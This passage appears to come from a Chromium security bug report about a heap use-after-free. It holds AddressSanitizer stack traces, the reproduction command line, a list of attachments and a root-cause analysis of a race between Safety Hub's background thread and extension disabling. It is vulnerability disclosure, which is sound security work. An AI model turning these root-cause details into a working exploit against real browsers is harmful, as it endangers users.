    #8 0x000356ccad74 in extensions::ManagementSetEnabledFunction::CheckPermissionsIncrease()+0x350 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xbe5ed74)
    #9 0x000356cca7bc in extensions::ManagementSetEnabledFunction::OnRequirementsChecked(std::__Cr::set<extensions::PreloadCheck::Error, std::__Cr::less<extensions::PreloadCheck::Error>, std::__Cr::allocator<extensions::PreloadCheck::Error>> const&)+0x1fc (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xbe5e7bc)
    #10 0x000356cca458 in extensions::ManagementSetEnabledFunction::CheckRequirements(extensions::Extension const&)+0x284 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xbe5e458)
    #11 0x000356cc943c in extensions::ManagementSetEnabledFunction::Run()+0xa88 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xbe5d43c)
    #12 0x0003563004b4 in ExtensionFunction::RunWithValidation()+0x1b8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb4944b4)
    #13 0x00035630eeb0 in extensions::ExtensionFunctionDispatcher::DispatchWithCallbackInternal(mojo::StructPtr<extensions::mojom::RequestParams>, content::RenderFrameHost*, content::RenderProcessHost&, base::OnceCallback<void (ExtensionFunction::ResponseType, base::ListValue, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, mojo::StructPtr<extensions::mojom::ExtraResponseData>)>)+0xf10 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb4a2eb0)
    #14 0x00035630f9d0 in extensions::ExtensionFunctionDispatcher::DispatchForServiceWorker(mojo::StructPtr<extensions::mojom::RequestParams>, int, base::OnceCallback<void (bool, base::ListValue, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, mojo::StructPtr<extensions::mojom::ExtraResponseData>)>)+0x3d8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb4a39d0)
    #15 0x000356482a10 in extensions::ServiceWorkerHost::RequestWorker(mojo::StructPtr<extensions::mojom::RequestParams>, base::OnceCallback<void (bool, base::ListValue, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, mojo::StructPtr<extensions::mojom::ExtraResponseData>)>)+0x244 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb616a10)
    #16 0x0003565ea5b4 in extensions::mojom::ServiceWorkerHostStubDispatch::AcceptWithResponder(extensions::mojom::ServiceWorkerHost*, mojo::Message*, std::__Cr::unique_ptr<mojo::MessageReceiverWithStatus, std::__Cr::default_delete<mojo::MessageReceiverWithStatus>>)+0x28c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb77e5b4)
    #17 0x00035e1769b4 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+0x8b8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1330a9b4)
    #18 0x00035e18b808 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1331f808)
    #19 0x00035e17bbdc in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+0x148 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1330fbdc)
    #20 0x00035e19852c in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*)+0x624 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1332c52c)
    #21 0x00035e197004 in mojo::internal::MultiplexRouter::Accept(mojo::Message*)+0x554 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1332b004)
    #22 0x00035e18b808 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1331f808)
    #23 0x00035e169bd0 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>)+0x37c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x132fdbd0)
    #24 0x00035e16b0e8 in mojo::Connector::ReadAllAvailableMessages()+0x234 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x132ff0e8)
    #25 0x00035e16ba60 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::*&&)(), base::WeakPtr<mojo::Connector>&&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(), base::WeakPtr<mojo::Connector>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x15c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x132ffa60)
    #26 0x00035da7a678 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x360 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c0e678)
    #27 0x00035dadd444 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x8f8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c71444)
    #28 0x00035dadc794 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c70794)
    #29 0x00035dbfd604 in base::MessagePumpCFRunLoopBase::RunWork()+0x1c0 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12d91604)

Thread T14 created by T0 here:
    #0 0x000100747ad0 in __sanitizer_weak_hook_memcmp+0x307c8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x4bad0)
    #1 0x00035dbac28c in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType)+0x26c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12d4028c)
    #2 0x00035db36418 in base::internal::WorkerThread::Start(scoped_refptr<base::SingleThreadTaskRunner>, base::WorkerThreadObserver*)+0x27c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12cca418)
    #3 0x00035db03780 in base::internal::ThreadGroup::BaseScopedCommandsExecutor::Flush()+0x244 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c97780)
    #4 0x00035db034dc in base::internal::ThreadGroup::BaseScopedCommandsExecutor::~BaseScopedCommandsExecutor()+0x44 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c974dc)
    #5 0x00035db098b0 in base::internal::ThreadGroupImpl::Start(unsigned long, unsigned long, base::TimeDelta, scoped_refptr<base::SingleThreadTaskRunner>, base::WorkerThreadObserver*, base::internal::ThreadGroup::WorkerEnvironment, bool, std::__Cr::optional<base::TimeDelta>)+0x3a8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c9d8b0)
    #6 0x00035db2ae40 in base::internal::ThreadPoolImpl::Start(base::ThreadPoolInstance::InitParams const&, base::WorkerThreadObserver*)+0x1454 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12cbee40)
    #7 0x000355187b08 in content::StartBrowserThreadPool()+0x148 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xa31bb08)
    #8 0x00035a8a542c in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool)+0x83c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xfa3942c)
    #9 0x00035a8a4954 in content::ContentMainRunnerImpl::Run()+0x568 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xfa38954)
    #10 0x00035a8a04a0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x854 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xfa344a0)
    #11 0x00035a8a0990 in content::ContentMain(content::ContentMainParams)+0x190 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xfa34990)
    #12 0x00034ae71cb0 in ChromeMain+0x494 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x5cb0)
    #13 0x000100388bb0 in main+0x1f8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/MacOS/Chromium:arm64+0x100000bb0)
    #14 0x000188ec7da0 in start+0x1b4c (/usr/lib/dyld:arm64e+0x1fda0)

SUMMARY: AddressSanitizer: heap-use-after-free (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb3f2aa4) in extensions::ExtensionInstallTimePermissionProvider::GetRuleIterator(content_settings::mojom::ContentSettingsType, bool) const+0x44c
Shadow bytes around the buggy address:
  0x606000277480: fd fd fd fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x606000277500: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
  0x606000277580: fd fd fd fd fd fd fd fa fa fa f7 fa fd fd fd fd
  0x606000277600: fd fd fd fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x606000277680: fa fa f7 fa fd fd fd fd fd fd fd fa fa fa f7 fa
=>0x606000277700: fd[fd]fd fd fd fd fd fd fa fa f7 fa fd fd fd fd
  0x606000277780: fd fd fd fd fa fa f7 fa fd fd fd fd fd fd fd fa
  0x606000277800: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
  0x606000277880: fd fd fd fd fd fd fd fd fa fa f7 fa fd fd fd fd
  0x606000277900: fd fd fd fa fa fa f7 fa fd fd fd fd fd fd fd fa
  0x606000277980: fa fa f7 fa fd fd fd fd fd fd fd fd fa fa f7 fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==41907==ADDITIONAL INFO

==41907==Note: Please include this section with the ASan report.
Task trace:
    #0 0x00035c35c7a4 in SafetyHubService::UpdateAsync()+0x110 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x114f07a4)
    #1 0x000361003184 in IPC::ChannelAssociatedGroupController::Accept(mojo::Message*)+0x7c4 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x16197184)
    #2 0x00035e1f9c68 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int)+0x22c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1338dc68)

Command line: `/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/MacOS/Chromium --no-sandbox --user-data-dir=/tmp/fastcat-extension-registry-uaf-sites-profile --disable-breakpad --no-first-run --no-default-browser-check --enable-logging=stderr --disable-popup-blocking --disable-background-timer-throttling --disable-renderer-backgrounding --extensions-on-chrome-urls --disable-features=ExperimentalWebMachineLearningNeuralNetwork,WebMachineLearningNeuralNetwork,WebNNCoreML,WebNNCoreMLExplicitGPUOrNPU --load-extension=/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/manager,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0000,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0001,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0002,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0003,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0004,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0005,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0006,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0007,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0008,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0009,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0010,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0011,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0012,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0013,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0014,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0015,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0016,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0017,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0018,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0019,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0020,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0021,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0022,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0023,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0024,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0025,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0026,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0027,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0028,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0029,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0030,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0031,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0032,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0033,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0034,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0035,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0036,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0037,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0038,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0039,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0040,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0041,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0042,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0043,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0044,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0045,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0046,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0047,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0048,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0049,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0050,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0051,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0052,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0053,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0054,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0055,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0056,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0057,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0058,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0059,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0060,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0061,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0062,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0063,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0064,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0065,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0066,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0067,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0068,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0069,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0070,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0071,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0072,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0073,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0074,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0075,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0076,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0077,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0078,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0079,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0080,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0081,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0082,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0083,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0084,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0085,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0086,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0087,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0088,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0089,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0090,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0091,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0092,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0093,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0094,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0095,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0096,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0097,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0098,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0099,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0100,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0101,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0102,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0103,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0104,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0105,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0106,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0107,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0108,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0109,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0110,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0111,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0112,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0113,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0114,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0115,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0116,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0117,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0118,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0119,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0120,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0121,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0122,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0123,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0124,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0125,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0126,/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025/targets/t0127 --flag-switches-begin --flag-switches-end --file-url-path-alias=/gen=/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/gen http://127.0.0.1:9000/poc.html`

MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==41907==END OF ADDITIONAL INFO


```
# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A \

## Attachments

- [asan.log](attachments/asan.log) (text/plain, 52.5 KB)
- [poc.html](attachments/poc.html) (text/html, 320 B)
- [serve.py](attachments/serve.py) (text/x-python, 364 B)
- [manifest.json](attachments/manifest.json) (application/json, 435 B)
- [settings_toggle.js](attachments/settings_toggle.js) (text/javascript, 1.2 KB)
- [sw.js](attachments/sw.js) (text/javascript, 3.0 KB)
- [poc.mov](attachments/poc.mov) (video/quicktime, 105.0 MB)

## Timeline

### zh...@gmail.com (2026-04-28)

## BISECT COMMIT

<https://chromium-review.googlesource.com/c/chromium/src/+/7627082>

### zh...@gmail.com (2026-04-28)

# RCA

This vulnerability is a browser-side heap use-after-free caused by a thread-safety and lifetime mismatch between Safety Hub's background content-settings enumeration path and the Extensions registry's UI-thread mutation path.

The crash becomes possible because `UnusedSitePermissionsManager::UpdateOnBackgroundThread()` calls into `HostContentSettingsMap::GetSettingsForOneType()` on a ThreadPool worker, while the newly added `ExtensionInstallTimePermissionProvider` answers that query by directly iterating `ExtensionRegistry::enabled_extensions()`. At the same time, the extension management API can disable an extension on the browser UI thread and erase the same `ExtensionSet` node being read by the background iterator.
